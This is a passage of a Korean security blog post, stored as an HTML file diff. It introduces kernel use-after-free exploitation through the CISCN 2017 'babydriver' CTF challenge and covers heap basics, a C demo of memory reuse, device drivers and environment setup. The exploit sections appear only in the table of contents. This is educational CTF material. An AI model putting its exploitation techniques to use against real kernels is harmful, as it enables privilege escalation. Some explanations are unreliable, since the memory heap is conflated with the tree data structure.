@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/swing_logo.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/swing_logo.png" color="#222">
+  <meta name="google-site-verification" content="uoL1t-yrbhPowL65E-xnG5D1FNLOwghJsIG6iqHrEsc">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"log.swuswing.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.19.2","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="1. 들어가며5월호의 주제는 Use-After-Free(UAF) 취약점이다. 해당 취약점을 이용한 CTF 문제 풀이 과정을 다룬다. UAF 취약점은 메모리 관리의 부주의로 인해 발생하는 보안 취약점 중 하나로, 해커가 악용할 경우 시스템 권한을 탈취당하거나 악성코드가 실행될 수 있다. 이러한 취약점은 특히 커널과 같은 중요한 시스템 컴포넌트에서 발생할 때">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kernel Use-After-Free">
+<meta property="og:url" content="https://log.swuswing.com/2024/05/31/monthly_24_05/index.html">
+<meta property="og:site_name" content="SW1NGL0G">
+<meta property="og:description" content="1. 들어가며5월호의 주제는 Use-After-Free(UAF) 취약점이다. 해당 취약점을 이용한 CTF 문제 풀이 과정을 다룬다. UAF 취약점은 메모리 관리의 부주의로 인해 발생하는 보안 취약점 중 하나로, 해커가 악용할 경우 시스템 권한을 탈취당하거나 악성코드가 실행될 수 있다. 이러한 취약점은 특히 커널과 같은 중요한 시스템 컴포넌트에서 발생할 때">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://log.swuswing.com/images/monthly_24_05_image1.png">
+<meta property="og:image" content="https://log.swuswing.com/images/monthly_24_05_image2.png">
+<meta property="og:image" content="https://log.swuswing.com/images/monthly_24_05_image3.png">
+<meta property="og:image" content="https://log.swuswing.com/images/monthly_24_05_image4.png">
+<meta property="og:image" content="https://log.swuswing.com/images/monthly_24_05_image5.png">
+<meta property="og:image" content="https://log.swuswing.com/images/monthly_24_05_image6.png">
+<meta property="og:image" content="https://log.swuswing.com/images/monthly_24_05_image7.png">
+<meta property="article:published_time" content="2024-05-30T15:00:00.000Z">
+<meta property="article:modified_time" content="2026-01-09T06:48:26.134Z">
+<meta property="article:author" content="SWING">
+<meta property="article:tag" content="System Hacking">
+<meta property="article:tag" content="Kernel">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://log.swuswing.com/images/monthly_24_05_image1.png">
+
+
+<link rel="canonical" href="https://log.swuswing.com/2024/05/31/monthly_24_05/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://log.swuswing.com/2024/05/31/monthly_24_05/","path":"2024/05/31/monthly_24_05/","title":"Kernel Use-After-Free"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Kernel Use-After-Free | SW1NGL0G</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/rss2.xml" title="SW1NGL0G" type="application/rss+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">SW1NGL0G</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-%EB%93%A4%EC%96%B4%EA%B0%80%EB%A9%B0"><span class="nav-number">1.</span> <span class="nav-text">1. 들어가며</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-kernel-%EC%A7%80%EC%8B%9D"><span class="nav-number">2.</span> <span class="nav-text">2. kernel 지식</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-Memory-Corruption"><span class="nav-number">2.1.</span> <span class="nav-text">2.1. Memory Corruption</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EA%B5%AC%EC%A1%B0"><span class="nav-number">2.2.</span> <span class="nav-text">2.2. 메모리 구조</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3-Heap"><span class="nav-number">2.3.</span> <span class="nav-text">2.3. Heap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-4-First-Fit-Algorithm"><span class="nav-number">2.4.</span> <span class="nav-text">2.4. First-Fit Algorithm</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-UAF-%EC%B7%A8%EC%95%BD%EC%A0%90"><span class="nav-number">3.</span> <span class="nav-text">3. UAF 취약점</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-UAF-%EB%AC%B8%EC%A0%9C-%EB%B6%84%EC%84%9D-%EB%B0%8F-%ED%92%80%EC%9D%B4"><span class="nav-number">4.</span> <span class="nav-text">4. UAF 문제 분석 및 풀이</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#4-1-%EB%94%94%EB%B0%94%EC%9D%B4%EC%8A%A4-%EB%93%9C%EB%9D%BC%EC%9D%B4%EB%B2%84"><span class="nav-number">4.1.</span> <span class="nav-text">4.1. 디바이스 드라이버</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-2-setting"><span class="nav-number">4.2.</span> <span class="nav-text">4.2. setting</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-1-vmlinux-%EC%83%9D%EC%84%B1"><span class="nav-number">4.2.1.</span> <span class="nav-text">4.2.1. vmlinux 생성</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-2-rootfs-cpio-%EC%95%95%EC%B6%95-%ED%95%B4%EC%A0%9C"><span class="nav-number">4.2.2.</span> <span class="nav-text">4.2.2. rootfs.cpio 압축 해제</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-3-qemu-%EC%84%A4%EC%B9%98"><span class="nav-number">4.2.3.</span> <span class="nav-text">4.2.3. qemu 설치</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-3-%EB%AC%B8%EC%A0%9C-%ED%92%80%EC%9D%B4-%EB%B0%8F-%EB%B6%84%EC%84%9D"><span class="nav-number">4.3.</span> <span class="nav-text">4.3. 문제 풀이 및 분석</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-1-boot-sh-%ED%99%95%EC%9D%B8"><span class="nav-number">4.3.1.</span> <span class="nav-text">4.3.1. boot.sh 확인</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-2-%EB%AC%B8%EC%A0%9C-%ED%92%80%EC%9D%B4-%EC%95%84%EC%9D%B4%EB%94%94%EC%96%B4"><span class="nav-number">4.3.2.</span> <span class="nav-text">4.3.2. 문제 풀이 아이디어</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-3-babydriver-ko-%EB%B6%84%EC%84%9D"><span class="nav-number">4.3.3.</span> <span class="nav-text">4.3.3. babydriver.ko 분석</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-4-struct-cred-%EC%9D%B4%EC%9A%A9"><span class="nav-number">4.3.4.</span> <span class="nav-text">4.3.4. struct cred 이용</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-5-%ED%95%A8%EC%88%98-%ED%98%B8%EC%B6%9C"><span class="nav-number">4.3.5.</span> <span class="nav-text">4.3.5. 함수 호출</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-6-Exploit"><span class="nav-number">4.3.6.</span> <span class="nav-text">4.3.6. Exploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-7-Exploit-code"><span class="nav-number">4.3.7.</span> <span class="nav-text">4.3.7. Exploit code</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-%EB%A7%88%EB%AC%B4%EB%A6%AC%ED%95%98%EB%A9%B0"><span class="nav-number">5.</span> <span class="nav-text">5. 마무리하며</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6-%EC%B0%B8%EA%B3%A0%EB%AC%B8%ED%97%8C"><span class="nav-number">6.</span> <span class="nav-text">6. 참고문헌</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">SWING</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">37</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">65</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOnN3dS5zd2luZ0BnbWFpbC5jb20=" title="E-Mail → mailto:swu.swing@gmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL0Bzd3Vzd2luZw==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;@swuswing"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9zd2luZ19zd3U=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;swing_swu"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9zd3Vzd2luZy5jb20v" title="https:&#x2F;&#x2F;swuswing.com&#x2F;">SWING Official Website</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://log.swuswing.com/2024/05/31/monthly_24_05/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="SWING">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SW1NGL0G">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Kernel Use-After-Free | SW1NGL0G">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Kernel Use-After-Free
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="far fa-user"></i>
+    </span>
+    <span class="post-meta-item-text">author: rlozll, c23kvx3</span>
+  </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2024-05-31 00:00:00" itemprop="dateCreated datePublished" datetime="2024-05-31T00:00:00+09:00">2024-05-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/free/" itemprop="url" rel="index"><span itemprop="name">free</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="1-들어가며"><a href="#1-들어가며" class="headerlink" title="1. 들어가며"></a>1. 들어가며</h1><p>5월호의 주제는 <strong>Use-After-Free(UAF)</strong> 취약점이다. 해당 취약점을 이용한 CTF 문제 풀이 과정을 다룬다. UAF 취약점은 메모리 관리의 부주의로 인해 발생하는 보안 취약점 중 하나로, 해커가 악용할 경우 시스템 권한을 탈취당하거나 악성코드가 실행될 수 있다. 이러한 취약점은 특히 커널과 같은 중요한 시스템 컴포넌트에서 발생할 때 매우 치명적일 수 있다.</p>
+<p>해당 글은 CTF 문제를 풀 때 필요한 전반적인 커널 지식과 문제 해결을 위한 접근 방법과 구체적 단계들을 설명한다. 이를 통해 UAF 취약점이 어떻게 악용될 수 있는지, 그리고 이를 방어하기 위한 기법들이 무엇이 될 수 있는지 생각하고 이해할 수 있다.</p>
+<span id="more"></span>
+<p><br><br></p>
+<h1 id="2-kernel-지식"><a href="#2-kernel-지식" class="headerlink" title="2. kernel 지식"></a>2. kernel 지식</h1><h2 id="2-1-Memory-Corruption"><a href="#2-1-Memory-Corruption" class="headerlink" title="2.1. Memory Corruption"></a>2.1. Memory Corruption</h2><ul>
+<li>메모리를 참조하는 부분에서 오류가 발생하는 취약점이다.</li>
+<li>공격자는 메모리가 corruption 되는 부분을 이용하여 공격자가 원하는 명령어를 참조하도록 수행이 가능하다.</li>
+</ul>
+<p>UAF는 Heap 영역에서 일어나는 취약점이며, Heap은 메모리 영역 중 하나이기 때문에 메모리 구조와 Heap에 대해서 알아야 한다.</p>
+<br>
+
+<h2 id="2-2-메모리-구조"><a href="#2-2-메모리-구조" class="headerlink" title="2.2. 메모리 구조"></a>2.2. 메모리 구조</h2><ol>
+<li><p>Code 영역: 프로그램의 (컴파일된 기계어) 코드가 올라가는 곳이다.</p>
+</li>
+<li><p>Data 영역: global variable과 static bariable이 할당되는 곳이다.</p>
+</li>
+<li><p>Stack 영역: local variable과 parameter가 저장되는 곳이다.</p>
+<p> 함수가 시작되면 해당 함수의 local variable이 stack에 저장되었다가 함수가 종료되면 해당 영역을 해제시킨다.</p>
+</li>
+<li><p>Heap 영역: 빈 공간으로, 필요에 따라 동적으로 메모리를 할당하기도 하고 해제하기도 한다.</p>
+<p> Heap 영역은 Stack에서 관리하는 이외의 데이터 형태를 사용하며, 컴파일 시 크기를 알지 못하다가 프로그램이 실행되면 크기가 결정되는 동적 할당 메모리를 받는 데 사용된다.</p>
+</li>
+</ol>
+<br>
+
+<h2 id="2-3-Heap"><a href="#2-3-Heap" class="headerlink" title="2.3. Heap"></a>2.3. Heap</h2><p>데이터에서 최댓값과 최솟값을 빠르게 찾기 위해 고안된 완전 이진트리이다.</p>
+<p><img src="/images/monthly_24_05_image1.png" alt="그림 1. https://velog.io/@jsbryan/%ED%9E%99-%EC%B5%9C%EC%86%8C-%ED%9E%99-%EC%B5%9C%EB%8C%80-%ED%9E%99, [이진트리 구조]"></p>
+<center><b>그림 1. [이진트리 구조]<br>https://velog.io/@jsbryan/%ED%9E%99-%EC%B5%9C%EC%86%8C-%ED%9E%99-%EC%B5%9C%EB%8C%80-%ED%9E%99</center></b><br>
+
+<p>부모 노드의 인덱스는 1, 왼쪽 자식 노드부터 2, 3 순서이다.</p>
+<p>Heap 구조는 위에서 말한대로 컴퓨터 안의 메모리 구조 중 사용자가 임의로 사용하는 메모리 공간으로, 대표적으로 <code>malloc()</code> 함수를 이용해 선언해주고, <code>free()</code> 함수를 통해 해제를 해준다.</p>
+<br>
+
+<h2 id="2-4-First-Fit-Algorithm"><a href="#2-4-First-Fit-Algorithm" class="headerlink" title="2.4. First-Fit Algorithm"></a>2.4. First-Fit Algorithm</h2><p>UAF에 대해 알기 전 또 알아야 할 것이 바로 First-Fit 알고리즘이다.</p>
+<p><strong>First-Fit 알고리즘</strong>은 메모리 할당 알고리즘들 중 하나로, 사용 가능한 공간들 중에서 첫번째로 찾아낸 공간을 할당하는 방식이다. </p>
+<p>Linux OS는 해당 알고리즘을 채택하고 있다.<br>이외에도 Best-Fit, Worst-Fit 알고리즘도 존재한다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">char*a = malloc(20);     // 0xe4b010</span><br><span class="line">char*b = malloc(20);     // 0xe4b030</span><br><span class="line">char*c = malloc(20);     // 0xe4b050</span><br><span class="line">char*d = malloc(20);     // 0xe4b070</span><br><span class="line"> </span><br><span class="line">free(a);</span><br><span class="line">free(b);</span><br><span class="line">free(c);</span><br><span class="line">free(d);</span><br><span class="line"> </span><br><span class="line">a = malloc(20);           // 0xe4b070</span><br><span class="line">b = malloc(20);           // 0xe4b050</span><br><span class="line">c = malloc(20);           // 0xe4b030</span><br><span class="line">d = malloc(20);           // 0xe4b010</span><br></pre></td></tr></table></figure>
+
+<p>위의 코드는 예시 코드다.</p>
+<p>코드를 보면, 각각 20 바이트씩 Heap 영역에 4개의 영역을 할당해 주었고, free를 해준 후 다시 4개의 영역을 할당 받고 있다. </p>
+<p>방식은 LIFO(Last In First Out)이다. 과정을 조금 더 설명해보겠다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;free&gt;</span><br><span class="line"></span><br><span class="line">head → a → tail</span><br><span class="line">head → b → a → tail</span><br><span class="line">head → c → b → a → tail</span><br><span class="line">head → d → c → b → a → tail</span><br><span class="line"></span><br><span class="line">&lt;malloc&gt;</span><br><span class="line"></span><br><span class="line">head → c → b → a → tail</span><br><span class="line">head → b → a → tail</span><br><span class="line">head → a → tail</span><br><span class="line">head → tail</span><br></pre></td></tr></table></figure>
+<p><br><br></p>
+<h1 id="3-UAF-취약점"><a href="#3-UAF-취약점" class="headerlink" title="3. UAF 취약점"></a>3. UAF 취약점</h1><p>Heap 영역에서 할당된 (malloc) 공간을 free로 영역을 해제하고, 메모리를 다시 할당 시 같은 공간을 재사용 하면서 생기는 취약점이다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>* heap1, *heap2, *heap3;</span><br><span class="line">    </span><br><span class="line">    heap1 = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">4</span>);</span><br><span class="line">    *heap1 = <span class="number">0xcaaaaaaa</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;heap1 address: %#x, %#x\n&quot;</span>, heap1, *heap1);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(heap1);</span><br><span class="line">    </span><br><span class="line">    heap2 = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;heap2 address: %#x, %#x\n&quot;</span>, heap2, *heap2);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(heap2);</span><br><span class="line">    </span><br><span class="line">    heap3 = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;heap3 address: %#x, %#x\n&quot;</span>, heap3, *heap3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>예시 코드를 돌려보면 아래와 같은 결과가 나온다.</p>
+<p><img src="/images/monthly_24_05_image2.png" alt="그림 2. [Use-After-free 취약점]"></p>
+<center><b>그림 2. [Use-After-free 취약점]</center></b>
+
+<ol>
+<li><code>heap1</code>을 할당하고 <code>free</code>를 해주고, 다른 변수(<code>heap2</code>)에 같은 크기로 할당하면 다시 그 공간을 재사용하게 된다.</li>
+<li><code>free</code>를 해주어도 그 전에 사용했던 공간에 할당이 가능하다.</li>
+<li>사이즈를 다르게 입력하면 다른 공간에 할당한다.</li>
+</ol>
+<p><br><br></p>
+<h1 id="4-UAF-문제-분석-및-풀이"><a href="#4-UAF-문제-분석-및-풀이" class="headerlink" title="4. UAF 문제 분석 및 풀이"></a>4. UAF 문제 분석 및 풀이</h1><p>CISCN CTF 2017에 출제된 <code>babydriver</code> 문제로 UAF가 어떻게 발생하는지 알아보자.</p>
+<br>
+
+<h2 id="4-1-디바이스-드라이버"><a href="#4-1-디바이스-드라이버" class="headerlink" title="4.1. 디바이스 드라이버"></a>4.1. 디바이스 드라이버</h2><p>먼저 본격적으로 코드 분석에 앞서, 사전지식으로 알아야 할 게 있다. 바로 디바이스 드라이버라는 것이다.</p>
+<p><strong>1. 디바이스 드라이버</strong></p>
+<p>키보드, 하드디스크 같은 디바이스들을 컨트롤하는 것이 바로 디바이스 드라이버이다. </p>
+<p><strong>디바이스 드라이버</strong>란 실제 장치 부분을 추상화시켜 사용자 프로그램이 정형화된 인터페이스를 통해 디바이스를 접근할 수 있도록 하는 프로그램이다. 리눅스에서는 모든 것을 파일로 간주하는데, 이러한 디바이스 드라이버도 파일로 관리된다.</p>
+<p><code>/dev/</code> 아래에 들어있는 파일들이 바로 디바이스 드라이버 인터페이스고, 하드웨어와는 독립적으로 응용 프로그램이 파일 <code>open</code>, <code>read</code> 같은 함수로 접근이 가능하다.</p>
+<p><img src="/images/monthly_24_05_image3.png" alt="그림 3. [Device Driver]"></p>
+<center><b>그림 3. [Device Driver]<br>https://jeongzero.oopy.io/c5c9c223-d17f-4bbc-b054-4d9fa1faffd1</center></b><br>
+
+<p>Real Device가 실제 물리적인 하드웨어이고, Device Driver를 통해 실제 디바이스를 컨트롤하게 된다. 그러나 장치 별로 제공되는 디바이스 드라이버가 다르기 때문에 리눅스에서는 VFS라는 파일 시스템 기능을 지원한다.</p>
+<p>또한 모든 디바이스 드라이버는 <code>/dev</code> 하위에 파일로 취급되고, 위에서 말한 <code>open</code>, <code>read</code>, <code>write</code> 등의 연산을 통해 디바이스를 컨트롤할 수 있다. 이러한 디바이스 파일에게는 고유한 번호와 이름이 할당되어 있다.</p>
+<p> <strong>2. 디바이스 드라이버 종류</strong></p>
+<p><img src="/images/monthly_24_05_image4.png" alt="그림 4. [Device Driver 종류]"></p>
+<center><b>그림 4. [Device Driver 종류]<br>https://jeongzero.oopy.io/c5c9c223-d17f-4bbc-b054-4d9fa1faffd1</center></b><br>
+
+<p>디바이스 드라이버는 크게 3가지로 나뉜다.</p>
+<table>
+<thead>
+<tr>
+<th>종류</th>
+<th>설명</th>
+<th>등록 함수</th>
+<th>특징</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Char device driver</td>
+<td>device를 파일처럼 접근하여 직접 read&#x2F;write 수행</td>
+<td><code>register_chrdev()</code></td>
+<td>버퍼 캐시 사용 X, 자료의 순차성을 지님, 터미널, 키보드 사운드 카드, 프린터 등</td>
+</tr>
+<tr>
+<td>block device</td>
+<td>disk와 같은 filesystem을 기반으로 block 단위로 data를 read&#x2F;write</td>
+<td><code>register_blkdev()</code></td>
+<td>블록 단위의 입출력 가능, 버퍼 캐시에 의한 내부 장치 표현, 파일 시스템에 의해 마운트되어 관리됨, 하드디스크 등</td>
+</tr>
+<tr>
+<td>network device driver</td>
+<td>network의 physical layer와 frame 단위의 data 송수신</td>
+<td><code>register_netdev()</code></td>
+<td>네트워크 스택과 네트워크 하드웨어 사이에 위치해 데이터 송수신 담당, 이더넷, 네트워크 인터페이스 카드 등</td>
+</tr>
+</tbody></table>
+<br>
+
+<h2 id="4-2-setting"><a href="#4-2-setting" class="headerlink" title="4.2. setting"></a>4.2. setting</h2><p>babydriver 문제 파일에는 <code>bzImage</code>, <code>rootfs.cpio</code>, <code>boot.sh</code> 파일들이 존재한다.</p>
+<p>문제 분석을 위해 다음과 같이 환경을 세팅해주었다.</p>
+<br>
+
+<h3 id="4-2-1-vmlinux-생성"><a href="#4-2-1-vmlinux-생성" class="headerlink" title="4.2.1. vmlinux 생성"></a>4.2.1. vmlinux 생성</h3><p><code>bzImage</code>를 이용해 <code>vmlinux</code>를 생성한다.<br><code>extract-vmlinux</code> 스크립트를 이용하면 <code>vmlinux</code>를 쉽게 추출할 수 있다.<br>extract-vmlinux 스크립트는 아래 사이트는 참고하였다.<br><span class="exturl" data-url="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RvcnZhbGRzL2xpbnV4L21hc3Rlci9zY3JpcHRzL2V4dHJhY3Qtdm1saW51eA==">https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux</span> </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract-vmlinux bzImage &gt; ./vmlinux </span><br></pre></td></tr></table></figure>
+<br>
+
+<h3 id="4-2-2-rootfs-cpio-압축-해제"><a href="#4-2-2-rootfs-cpio-압축-해제" class="headerlink" title="4.2.2. rootfs.cpio 압축 해제"></a>4.2.2. rootfs.cpio 압축 해제</h3><p><code>rootfs.cpio</code>는 압축된 파일 시스템이므로 압축을 풀어서 파일 시스템을 추출한다. </p>
+<p><code>rootfs.gz</code>로 확장자를 변경한 뒤 <code>gzip -d rootfs.gz</code>로 압축을 풀고, <code>cpio -id -v &lt; rootfs.cpio</code> 명령어를 통해 파일 시스템을 추출하였다. </p>
+<p><code>lib/modules/4.4.72</code>에 분석할 커널 모듈인 <code>babydriver.ko</code>가 존재한다. </p>
+<br>
+
